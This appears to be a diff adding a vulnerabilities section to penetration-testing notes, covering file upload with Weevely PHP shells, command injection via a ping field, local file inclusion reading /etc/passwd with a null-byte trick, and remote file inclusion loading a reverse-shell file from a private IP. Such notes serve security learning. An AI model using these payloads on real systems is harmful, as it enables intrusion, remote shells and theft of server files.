@@ -476,3 +476,52 @@ To find files and directories on a webserver use Dirb with a wordlist to brute f
 * `dirb [target website]`
 
 After that, analyze the files and look for something useful like `robots.txt` that tells search engines how to deal with the website, it usually contains hidden files.
+
+### Vulnerabilities
+
+#### File Upload
+
+This vulnerability allows the client to upload ANY file, so you can upload a shell in a programming language 
+that the server understands and get control over the target.
+
+To generate a PHP shell, Weevely can be used, 
+but you can upload any file like a 
+meterpreter payloads.
+
+* Generate the payload
+  * `weevely generate [password] [file 
+name]`
+* Upload the file
+* Start the payload
+  * `weevely [file url] [password]`
+
+#### Code Execution
+
+This vulnerability allows the client to perform operating system code on the target server.
+
+You can run a reverse connection code and run it on the server.
+
+Input to make a Ping (ie)
+
+`192.168.0.1; [any command]`
+
+#### Local File Inclusion
+
+This allows the client to read any file that is on the target server.
+
+It can be seen in the url, if in it there is something like 
+`https://website.com/upload/?page=index.php` it means that the website is accessing a 
+file on the server, so you can type any path in there and get files.
+
+To test it try to load the `passwd` file `https://website.com/upload/?page=../../../../etc/passwd`
+
+If the server adds the `.php` at the end of the file automatically, like so `<?php “include/”.include($_GET['filename'].“.php”); 
+?>`, then you can add `%00` to the end of the string to tell to the server to ignore anything after that.
+
+#### Remote File Inclusion
+
+If the server turned on the functions `allow_url_include` and `allow_url_fopen`, the attacker can upload any file from any 
+server to the target.
+
+For this to work, make a php file that gives you a reverse connection to the target and save it as `.txt`. Then put 
+this on you server, copy the link to the file and paste in the string like so `https://website.com/upload/?page=http://192.168.10.26/php-reverse.txt?`
